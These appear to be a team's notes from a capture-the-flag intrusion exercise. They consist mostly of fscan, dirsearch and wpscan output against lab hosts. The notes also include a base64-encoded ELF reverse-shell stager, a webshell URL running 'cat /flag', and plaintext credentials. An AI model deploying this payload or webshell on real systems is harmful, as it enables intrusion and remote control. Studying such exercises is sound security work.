### Flag完整格式一般为：DASCTF{\*\*\*\*\*\*}或flag{\*\*\*\*\*\*}，只需要提交{}内的内容。若Flag为其它格式，则会在题目描述中单独说明。

### 那到时候，flag出了看一眼有没有血，没有就先屯着，记得标注好

参赛题目总数： 28 题靶机数量： 19 个

靶机URL：10.1.118.30
f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1toCjJ2GmgCABFcieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZsmqwA82AhcB4Av/huAEAAAC7AQAAAM2A
录屏：Obs 视频码率调成 250 Kbps 就够用

gitlab version 13.9
http://192.168.190.20:9000/uploads/logo/20251025/573524b277bba6df7ce2fe4ccbf2e557.php?cmd=system(%27cat%20/flag%27);
pass:cmd
# 代理
1  10.50.118.26:1080
2gitlab:  10.50.118.26:1081
2php:  10.50.118.26:9999
```
192.168.225.1:22 open
192.168.225.1:80 open
192.168.225.15:80 open
192.168.225.1:8080 open
192.168.225.20:6379 open
192.168.225.130:5432 open
192.168.225.10:3306 open
192.168.225.1:80 open
192.168.225.15:80 open
192.168.225.1:22 open
192.168.225.15:9000 open
[+] FCGI 192.168.225.15:9000 
Status: 403 Forbidden
X-Powered-By: PHP/7.3.33
Content-type: text/html; charset=UTF-8
Access denied.
stderr:Access to the script '/etc/issue' has been denied (see security.limit_extensions)
plesa try other path,as -path /www/wwwroot/index.php
[*] WebTitle http://192.168.225.1:8080 code:404 len:866    title:Error 404 - Not Found
[+] Postgres:192.168.225.130:5432:postgres 123456
[*] WebTitle http://192.168.225.15     code:302 len:0      title:None 跳转url: http://192.168.225.15/openv/#/
[*] WebTitle http://192.168.225.15/openv/#/ code:200 len:2721   title:页面跳转中......
[*] WebTitle http://192.168.225.1      code:200 len:25245  title:美枢科技 &#8211; 美枢科技股份有限公司
[+] PocScan http://192.168.225.15 poc-yaml-php-cgi-cve-2012-1823 
192.168.200.20:22 open
192.168.200.1:22 open
192.168.225.10:3306 open
```

```
    Proto  Local address          Remote address     State        User  Inode  PID/Program name
    -----  -------------          --------------     -----        ----  -----  ----------------
    tcp    127.0.0.1:3000         0.0.0.0:*          LISTEN       992   0
    tcp    0.0.0.0:8060           0.0.0.0:*          LISTEN       0     0
    tcp    127.0.0.11:34207       0.0.0.0:*          LISTEN       0     0
    tcp    127.0.0.1:9121         0.0.0.0:*          LISTEN       997   0
    tcp    127.0.0.1:9090         0.0.0.0:*          LISTEN       992   0
    tcp    127.0.0.1:9187         0.0.0.0:*          LISTEN       996   0
    tcp    127.0.0.1:9093         0.0.0.0:*          LISTEN       992   0
    tcp    127.0.0.1:9229         0.0.0.0:*          LISTEN       998   0
    tcp    127.0.0.1:8080         0.0.0.0:*          LISTEN       998   0
    tcp    127.0.0.1:9168         0.0.0.0:*          LISTEN       998   0
    tcp    0.0.0.0:80             0.0.0.0:*          LISTEN       0     0
    tcp    127.0.0.1:8082         0.0.0.0:*          LISTEN       998   0
```

```
./fscan32 -h 192.168.190.210/24

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
(icmp) Target 192.168.190.210 is alive
(icmp) Target 192.168.190.1   is alive
(icmp) Target 192.168.190.20  is alive
(icmp) Target 192.168.190.59  is alive
(icmp) Target 192.168.190.254 is alive
[*] Icmp alive hosts len is: 5
192.168.190.59:80 open
192.168.190.20:80 open
192.168.190.1:80 open
192.168.190.1:22 open
192.168.190.1:8080 open
192.168.190.20:8001 open
192.168.190.210:8080 open
192.168.190.20:8000 open
192.168.190.20:3000 open
192.168.190.20:9000 open
192.168.190.20:8080 open
[*] alive ports len is: 11
start vulscan
[*] WebTitle http://192.168.190.20:8001 code:200 len:612    title:Welcome to nginx!
[*] WebTitle http://192.168.190.20:8080 code:404 len:866    title:Error 404 - Not Found
[*] WebTitle http://192.168.190.1:8080 code:404 len:866    title:Error 404 - Not Found
[*] WebTitle http://192.168.190.210:8080 code:404 len:866    title:Error 404 - Not Found
[*] WebTitle http://192.168.190.20:3000 code:200 len:2374   title:Flowise - Low-code LLM apps builder
[*] WebTitle http://192.168.190.20:9000 code:302 len:0      title:None 跳转url: http://192.168.190.20:9000/openv/#/
[*] WebTitle http://192.168.190.20:9000/openv/#/ code:200 len:2721   title:页面跳转中......
[*] WebTitle http://192.168.190.20:8000 code:302 len:106    title:None 跳转url: http://192.168.190.20:8000/users/sign_in
[*] WebTitle http://192.168.190.59     code:200 len:25293  title:美枢科技 &#8211; 美枢科技股份有限公司
[*] WebTitle http://192.168.190.20:8000/users/sign_in code:200 len:54177  title:Sign in · GitLab
[*] WebTitle http://192.168.190.1      code:200 len:25245  title:美枢科技 &#8211; 美枢科技股份有限公司
[*] WebTitle http://192.168.190.20     code:200 len:25293  title:美枢科技 &#8211; 美枢科技股份有限公司
[+] InfoScan http://192.168.190.20:8000/users/sign_in [GitLab]
```
内网网卡
Interface 19
============
Name         : eth0
Hardware MAC : 02:42:c0:a8:be:d2
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.168.190.210
IPv4 Netmask : 255.255.255.0

[CTF Wiki](http://10.50.118.12:4100)

[Linux 101](http://10.50.118.12:1145)

https://10.50.118.26:60000/#/user/login
root:050928@Tdd



```
F:\CTF\web tools\tools\fscan\fscan1.8.4>fscan.exe -h 10.1.118.30

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
10.1.118.30:22 open
10.1.118.30:80 open
10.1.118.30:8080 open
[*] alive ports len is: 3
start vulscan
[*] WebTitle http://10.1.118.30:8080   code:404 len:866    title:Error 404 - Not Found
[*] WebTitle http://10.1.118.30        code:200 len:25149  title:美枢科技 &#8211; 美枢科技股份有限公司
已完成 3/3
[*] 扫描结束,耗时: 1m28.4449681s
```
有.git
![](/uploads/upload_9179e8906d3f2e772bc099d2b2dea440.png)
有一个提交init
`0000000000000000000000000000000000000000 d31c15a7275657b2112712c218b6c4095574de7c root <root@misson-tech.com> 1759912925 +0000	commit (initial): wordpress web`
![](/uploads/upload_4571026b442835176cd2a91f2b59a194.png)

dirsearch扫完了：
```
F:\CTF\web tools\dirsearch-master>python dirsearch.py -u 10.1.118.30 -e *
F:\CTF\web tools\dirsearch-master\lib\core\installation.py:24: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, html, htm, js, tar.gz | HTTP method: GET | Threads: 25
Wordlist size: 15019

Target: http://10.1.118.30/

[09:33:47] Scanning:
[09:33:54] 301 -     0B - /%2e%2e//google.com  ->  http://10.1.118.30/%2E%2E/google.com
[09:35:14] 301 -   309B - /.git  ->  http://10.1.118.30/.git/
[09:35:14] 403 -   291B - /.git/
[09:35:14] 403 -   300B - /.git/branches/
[09:35:14] 200 -    14B - /.git/COMMIT_EDITMSG
[09:35:14] 200 -    92B - /.git/config
[09:35:14] 200 -    73B - /.git/description
[09:35:14] 200 -    23B - /.git/HEAD
[09:35:14] 403 -   297B - /.git/hooks/
[09:35:16] 200 -  310KB - /.git/index
[09:35:16] 403 -   296B - /.git/info/
[09:35:16] 200 -   240B - /.git/info/exclude
[09:35:17] 403 -   296B - /.git/logs/
[09:35:17] 200 -   159B - /.git/logs/HEAD
[09:35:17] 301 -   319B - /.git/logs/refs  ->  http://10.1.118.30/.git/logs/refs/
[09:35:17] 301 -   325B - /.git/logs/refs/heads  ->  http://10.1.118.30/.git/logs/refs/heads/
[09:35:17] 200 -   159B - /.git/logs/refs/heads/master
[09:35:17] 403 -   299B - /.git/objects/
[09:35:17] 403 -   296B - /.git/refs/
[09:35:17] 301 -   320B - /.git/refs/heads  ->  http://10.1.118.30/.git/refs/heads/
[09:35:17] 200 -    41B - /.git/refs/heads/master
[09:35:18] 301 -   319B - /.git/refs/tags  ->  http://10.1.118.30/.git/refs/tags/
[09:37:36] 301 -     0B - /0  ->  http://10.1.118.30/0/
[09:39:27] 301 -     0B - /adm/index.php  ->  http://10.1.118.30/adm/
[09:39:29] 302 -     0B - /admin  ->  http://10.1.118.30/wp-admin/
[09:39:42] 301 -     0B - /admin.  ->  http://10.1.118.30/admin
[09:39:49] 302 -     0B - /admin/  ->  http://10.1.118.30/wp-admin/
[09:40:06] 301 -     0B - /admin/index.php  ->  http://10.1.118.30/admin/
[09:40:12] 301 -     0B - /admin/mysql/index.php  ->  http://10.1.118.30/admin/mysql/
[09:40:12] 301 -     0B - /admin/phpMyAdmin/index.php  ->  http://10.1.118.30/admin/phpMyAdmin/
[09:40:12] 301 -     0B - /admin/mysql2/index.php  ->  http://10.1.118.30/admin/mysql2/
[09:40:12] 301 -     0B - /admin/phpmyadmin/index.php  ->  http://10.1.118.30/admin/phpmyadmin/
[09:40:13] 301 -     0B - /admin/pma/index.php  ->  http://10.1.118.30/admin/pma/
[09:40:13] 301 -     0B - /admin/phpmyadmin2/index.php  ->  http://10.1.118.30/admin/phpmyadmin2/
[09:40:13] 301 -     0B - /admin/PMA/index.php  ->  http://10.1.118.30/admin/PMA/
[09:40:19] 301 -     0B - /admin2/index.php  ->  http://10.1.118.30/admin2/
[09:40:34] 301 -     0B - /admin_area/index.php  ->  http://10.1.118.30/admin_area/
[09:42:16] 301 -     0B - /adminarea/index.php  ->  http://10.1.118.30/adminarea/
[09:42:29] 301 -     0B - /admincp/index.php  ->  http://10.1.118.30/admincp/
[09:42:38] 301 -     0B - /adminer/index.php  ->  http://10.1.118.30/adminer/
[09:43:00] 301 -     0B - /administrator/index.php  ->  http://10.1.118.30/administrator/
[09:43:50] 301 -     0B - /apc/index.php  ->  http://10.1.118.30/apc/
[09:44:16] 301 -     0B - /asset..  ->  http://10.1.118.30/asset
[09:44:18] 301 -     0B - /atom  ->  http://10.1.118.30/feed/atom/
[09:44:30] 301 -     0B - /axis2-web//HappyAxis.jsp  ->  http://10.1.118.30/axis2-web/HappyAxis.jsp
[09:44:30] 301 -     0B - /axis//happyaxis.jsp  ->  http://10.1.118.30/axis/happyaxis.jsp
[09:44:31] 301 -     0B - /axis2//axis2-web/HappyAxis.jsp  ->  http://10.1.118.30/axis2/axis2-web/HappyAxis.jsp
[09:44:44] 301 -     0B - /bb-admin/index.php  ->  http://10.1.118.30/bb-admin/
[09:44:56] 301 -     0B - /bitrix/admin/index.php  ->  http://10.1.118.30/bitrix/admin/
[09:45:38] 301 -     0B - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  http://10.1.118.30/Citrix/AccessPlatform/auth/clientscripts/cookies.js
[09:45:39] 301 -     0B - /claroline/phpMyAdmin/index.php  ->  http://10.1.118.30/claroline/phpMyAdmin/
[09:46:53] 302 -     0B - /dashboard  ->  http://10.1.118.30/wp-admin/
[09:46:54] 302 -     0B - /dashboard/  ->  http://10.1.118.30/wp-admin/
[09:47:03] 301 -     0B - /db/index.php  ->  http://10.1.118.30/db/
[09:47:05] 301 -     0B - /dbadmin/index.php  ->  http://10.1.118.30/dbadmin/
[09:47:59] 301 -     0B - /engine/classes/swfupload//swfupload.swf  ->  http://10.1.118.30/engine/classes/swfupload/swfupload.swf
[09:47:59] 301 -     0B - /engine/classes/swfupload//swfupload_f9.swf  ->  http://10.1.118.30/engine/classes/swfupload/swfupload_f9.swf
[09:48:11] 301 -     0B - /etc/lib/pChart2/examples/imageMap/index.php  ->  http://10.1.118.30/etc/lib/pChart2/examples/imageMap/
[09:48:24] 301 -     0B - /extjs/resources//charts.swf  ->  http://10.1.118.30/extjs/resources/charts.swf
[09:48:28] 302 -     0B - /favicon.ico  ->  http://10.1.118.30/wp-includes/images/w-logo-blue-white-bg.png
[09:48:31] 301 -     0B - /feed  ->  http://10.1.118.30/feed/
[09:49:41] 301 -     0B - /html/js/misc/swfupload//swfupload.swf  ->  http://10.1.118.30/html/js/misc/swfupload/swfupload.swf
[09:50:05] 301 -     0B - /index.php  ->  http://10.1.118.30/
[09:50:08] 301 -     0B - /index.php/login/  ->  http://10.1.118.30/login/
[09:50:22] 301 -     0B - /install/index.php?upgrade/  ->  http://10.1.118.30/install/?upgrade/
[09:50:33] 301 -     0B - /jkstatus;  ->  http://10.1.118.30/jkstatus
[09:50:57] 200 -   19KB - /license.txt
[09:51:14] 302 -     0B - /login  ->  http://10.1.118.30/wp-login.php
[09:51:17] 301 -     0B - /login.wdm%2e  ->  http://10.1.118.30/login.wdm
[09:51:17] 302 -     0B - /login/  ->  http://10.1.118.30/wp-login.php
[09:51:17] 301 -     0B - /login.wdm%20  ->  http://10.1.118.30/login.wdm
[09:52:19] 301 -     0B - /modelsearch/index.php  ->  http://10.1.118.30/modelsearch/
[09:52:36] 301 -     0B - /myadmin/index.php  ->  http://10.1.118.30/myadmin/
[09:52:36] 301 -     0B - /myadmin2/index.php  ->  http://10.1.118.30/myadmin2/
[09:52:36] 301 -     0B - /mysql-admin/index.php  ->  http://10.1.118.30/mysql-admin/
[09:52:38] 301 -     0B - /mysql/index.php  ->  http://10.1.118.30/mysql/
[09:52:40] 301 -     0B - /mysqladmin/index.php  ->  http://10.1.118.30/mysqladmin/
[09:52:44] 301 -     0B - /New%20folder%20(2)  ->  http://10.1.118.30/New%20folder%20(2
[09:53:25] 301 -     0B - /panel-administracion/index.php  ->  http://10.1.118.30/panel-administracion/
[09:53:49] 301 -     0B - /phpadmin/index.php  ->  http://10.1.118.30/phpadmin/
[09:53:52] 301 -     0B - /phpma/index.php  ->  http://10.1.118.30/phpma/
[09:53:54] 301 -     0B - /phpmyadmin!!  ->  http://10.1.118.30/phpmyadmin
[09:54:14] 301 -     0B - /phpmyadmin-old/index.php  ->  http://10.1.118.30/phpmyadmin-old/
[09:54:16] 301 -     0B - /phpMyAdmin.old/index.php  ->  http://10.1.118.30/phpMyAdmin.old/
[09:54:16] 301 -     0B - /phpmyadmin/index.php  ->  http://10.1.118.30/phpmyadmin/
[09:54:17] 301 -     0B - /phpmyadmin/phpmyadmin/index.php  ->  http://10.1.118.30/phpmyadmin/phpmyadmin/
[09:54:17] 301 -     0B - /phpMyAdmin/index.php  ->  http://10.1.118.30/phpMyAdmin/
[09:54:17] 301 -     0B - /phpMyAdmin/phpMyAdmin/index.php  ->  http://10.1.118.30/phpMyAdmin/phpMyAdmin/
[09:54:18] 301 -     0B - /phpmyadmin0/index.php  ->  http://10.1.118.30/phpmyadmin0/
[09:54:18] 301 -     0B - /phpmyadmin2/index.php  ->  http://10.1.118.30/phpmyadmin2/
[09:54:19] 301 -     0B - /phpmyadmin1/index.php  ->  http://10.1.118.30/phpmyadmin1/
[09:54:20] 301 -     0B - /phpMyAdminold/index.php  ->  http://10.1.118.30/phpMyAdminold/
[09:54:20] 301 -     0B - /phpMyadmin_bak/index.php  ->  http://10.1.118.30/phpMyadmin_bak/
[09:54:29] 301 -     0B - /pma-old/index.php  ->  http://10.1.118.30/pma-old/
[09:54:30] 301 -     0B - /PMA/index.php  ->  http://10.1.118.30/PMA/
[09:54:30] 301 -     0B - /pma/index.php  ->  http://10.1.118.30/pma/
[09:54:30] 301 -     0B - /PMA2/index.php  ->  http://10.1.118.30/PMA2/
[09:54:31] 301 -     0B - /pmamy/index.php  ->  http://10.1.118.30/pmamy/
[09:54:32] 301 -     0B - /pmamy2/index.php  ->  http://10.1.118.30/pmamy2/
[09:54:33] 301 -     0B - /pmd/index.php  ->  http://10.1.118.30/pmd/
[09:55:11] 301 -     0B - /rating_over.  ->  http://10.1.118.30/rating_over
[09:55:12] 200 -    7KB - /readme.html
[09:55:42] 200 -   113B - /robots.txt
[09:55:46] 301 -     0B - /roundcube/index.php  ->  http://10.1.118.30/roundcube/
[09:55:48] 301 -     0B - /rss  ->  http://10.1.118.30/feed/
[09:55:49] 301 -     0B - /s  ->  http://10.1.118.30/sample-page/
[09:55:53] 301 -     0B - /sample  ->  http://10.1.118.30/sample-page/
[09:56:06] 403 -   299B - /server-status
[09:56:06] 403 -   300B - /server-status/
[09:56:47] 301 -     0B - /siteadmin/index.php  ->  http://10.1.118.30/siteadmin/
[09:56:51] 302 -     0B - /sitemap.xml  ->  http://10.1.118.30/wp-sitemap.xml
[09:57:07] 301 -     0B - /sql/index.php  ->  http://10.1.118.30/sql/
[09:57:18] 301 -     0B - /static..  ->  http://10.1.118.30/static
[09:57:29] 301 -     0B - /sugarcrm/index.php?module=Contacts&action=ShowDuplicates  ->  http://10.1.118.30/sugarcrm/?module=Contacts&action=ShowDuplicates
[09:57:29] 301 -     0B - /sugarcrm/index.php?module=Accounts&action=ShowDuplicates  ->  http://10.1.118.30/sugarcrm/?module=Accounts&action=ShowDuplicates
[09:57:53] 301 -     0B - /templates/rhuk_milkyway/index.php  ->  http://10.1.118.30/templates/rhuk_milkyway/
[09:57:53] 301 -     0B - /templates/ja-helio-farsi/index.php  ->  http://10.1.118.30/templates/ja-helio-farsi/
[09:57:54] 301 -     0B - /templates/beez/index.php  ->  http://10.1.118.30/templates/beez/
[09:58:19] 301 -     0B - /tmp/index.php  ->  http://10.1.118.30/tmp/
[09:58:21] 301 -     0B - /tools/phpMyAdmin/index.php  ->  http://10.1.118.30/tools/phpMyAdmin/
[09:58:27] 301 -     0B - /typo3/phpmyadmin/index.php  ->  http://10.1.118.30/typo3/phpmyadmin/
[09:59:41] 301 -     0B - /web/phpMyAdmin/index.php  ->  http://10.1.118.30/web/phpMyAdmin/
[09:59:44] 301 -     0B - /webadmin/index.php  ->  http://10.1.118.30/webadmin/
[09:59:59] 301 -   313B - /wp-admin  ->  http://10.1.118.30/wp-admin/
[10:00:02] 409 -    3KB - /wp-admin/setup-config.php
[10:00:03] 400 -     1B - /wp-admin/admin-ajax.php
[10:00:04] 200 -     0B - /wp-config.php
[10:00:04] 200 -    1KB - /wp-admin/install.php
[10:00:05] 301 -   315B - /wp-content  ->  http://10.1.118.30/wp-content/
[10:00:05] 200 -     0B - /wp-content/
[10:00:06] 302 -     0B - /wp-admin/  ->  http://10.1.118.30/wp-login.php?redirect_to=http%3A%2F%2F10.1.118.30%2Fwp-admin%2F&reauth=1
[10:00:07] 403 -   322B - /wp-content/plugins/akismet/admin.php
[10:00:07] 403 -   324B - /wp-content/plugins/akismet/akismet.php
[10:00:08] 200 -   242B - /wp-content/plugins/hello.php
[10:00:08] 200 -     0B - /wp-content/themes/
[10:00:09] 403 -   305B - /wp-content/uploads/
[10:00:10] 301 -     0B - /wp-content/plugins/adminer/inc/editor/index.php  ->  http://10.1.118.30/wp-content/plugins/adminer/inc/editor/
[10:00:11] 301 -   316B - /wp-includes  ->  http://10.1.118.30/wp-includes/
[10:00:11] 403 -   298B - /wp-includes/
[10:00:11] 200 -     0B - /wp-includes/rss-functions.php
[10:00:12] 200 -     0B - /wp-cron.php
[10:00:13] 200 -  132KB - /wp-json/
[10:00:13] 200 -    7KB - /wp-login.php
[10:00:13] 200 -   565B - /wp-json/wp/v2/users/
[10:00:13] 200 -   512B - /wp-sitemap.xml
[10:00:14] 200 -    2KB - /wp-sitemap-posts-post-1.xml
[10:00:14] 302 -     0B - /wp-signup.php  ->  http://10.1.118.30/wp-login.php?action=register
[10:00:15] 301 -     0B - /wp-register.php  ->  http://10.1.118.30/wp-login.php?action=register
[10:00:15] 200 -   239B - /wp-sitemap-users-1.xml
[10:00:15] 200 -   280B - /wp-sitemap-posts-page-1.xml
[10:00:22] 301 -     0B - /www/phpMyAdmin/index.php  ->  http://10.1.118.30/www/phpMyAdmin/
[10:00:26] 301 -     0B - /xampp/phpmyadmin/index.php  ->  http://10.1.118.30/xampp/phpmyadmin/
[10:00:37] 405 -    42B - /xmlrpc.php

Task Complete
```

## GitHack拿到源码（只有一次init提交）
`python GitHack.py -u http://10.1.118.30/.git`
正在审计代码(没招了)

```
└─$ wpscan --url http://10.1.118.30
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]N
[+] URL: http://10.1.118.30/ [10.1.118.30]
[+] Started: Sat Oct 25 09:38:08 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.25 (Debian)
 |  - X-Powered-By: PHP/7.0.33
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.1.118.30/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.1.118.30/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.1.118.30/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.1.118.30/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.8.12 identified (Outdated, released on 2025-09-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.1.118.30/feed/, <generator>https://wordpress.org/?v=5.8.12</generator>
 |  - http://10.1.118.30/comments/feed/, <generator>https://wordpress.org/?v=5.8.12</generator>

[+] WordPress theme in use: futurio
 | Location: http://10.1.118.30/wp-content/themes/futurio/
 | Latest Version: 1.5.4 (up to date)
 | Last Updated: 2024-05-03T00:00:00.000Z
 | Readme: http://10.1.118.30/wp-content/themes/futurio/readme.txt
 | Style URL: http://10.1.118.30/wp-content/themes/futurio/style.css?ver=1.5.4
 | Style Name: Futurio
 | Style URI: https://futuriowp.com/
 | Description: Futurio is a lightweight, fast and customizable free multi-purpose and WooCommerce WordPress theme, ...
 | Author: FuturioWP
 | Author URI: https://futuriowp.com/about/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.5.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.1.118.30/wp-content/themes/futurio/style.css?ver=1.5.4, Match: 'Version: 1.5.4'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:01:17 <=========================================> (137 / 137) 100.00% Time: 00:01:17

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Oct 25 09:40:11 2025
[+] Requests Done: 170
[+] Cached Requests: 7
[+] Data Sent: 41.365 KB
[+] Data Received: 238.577 KB
[+] Memory used: 281.168 MB
[+] Elapsed time: 00:02:03
```